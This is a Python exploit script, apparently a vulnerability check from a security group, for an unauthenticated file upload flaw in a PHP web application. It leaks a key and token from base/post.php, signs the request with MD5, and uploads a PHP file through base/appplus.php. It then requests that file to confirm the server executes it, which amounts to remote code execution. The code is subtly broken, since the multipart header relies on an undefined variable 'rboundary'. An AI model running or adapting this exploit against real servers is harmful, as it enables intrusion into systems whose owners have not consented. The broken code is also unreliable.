#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
from hashlib import md5

urllib3.disable_warnings()

def verify(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"base/post.php"
	body="act=appcode"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	print(response.text )
	if response.status_code == 200 and "k=" in response.text and "t=" in response.text:
		r0=True
		try:
			key=re.findall("k=(\w+)",response.text)[0]
			token=re.findall("t=(\d+)",response.text)[0]
			md=md5(str(key+token).encode()).hexdigest()
		except:
			token=''
			md=''
	else:
		token=''
		md=''
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"base/appplus.php"
	body = "------WebKitFormBoundarysuaycshx\r\nContent-Disposition: form-data; name=\"file\"; filename=\"vulntest.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo \"vulntest\";?>\r\n------WebKitFormBoundarysuaycshx\r\nContent-Disposition: form-data; name=\"act\"\r\n\r\nupload\r\n------WebKitFormBoundarysuaycshx\r\nContent-Disposition: form-data; name=\"r_size\"\r\n\r\n24\r\n------WebKitFormBoundarysuaycshx\r\nContent-Disposition: form-data; name=\"t\"\r\n\r\n"+token+"\r\n------WebKitFormBoundarysuaycshx\r\nContent-Disposition: form-data; name=\"m\"\r\n\r\n"+md+"\r\n------WebKitFormBoundarysuaycshx\r\nContent-Disposition: form-data; name=\"path\"\r\n\r\nupload\r\n------WebKitFormBoundarysuaycshx--\r\n"
	headers={'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary'+rboundary+''}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	#print(key, token, md, response.text)
	if response.status_code == 200 and ".php" in response.text:
		r1=True
		try:
			fname=re.findall("upload/(\\w+.php)",response.text)[0]
		except:
			fname=''
	else:
		fname=''
		r1=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+f"upload/{fname}"
	#print(url)
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "vulntest" in response.text:
		r2=True
	else:
		r2=False
	if r0 and r1 and r2:
		return url
	else:
		return ""


if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，文件上传后的路径为：", info)
    else:
        print("[-]漏洞不存在")



